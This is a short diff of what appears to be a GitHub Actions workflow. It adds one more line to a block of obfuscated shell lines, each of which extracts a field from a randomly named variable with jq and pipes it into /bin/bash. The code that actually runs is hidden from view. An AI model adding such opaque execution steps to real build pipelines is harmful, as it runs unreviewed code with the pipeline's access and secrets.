@@ -32,6 +32,7 @@ jobs:
           echo $kougw2640 | jq -r .mfq43 | /bin/bash
           echo $df60 | jq -r .qjkke3 | /bin/bash
           printf '%s' "$fpwwq3" | jq -r .drvn7770 | /bin/bash
+          printf '%s' "$smkij52" | jq -r .req0 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
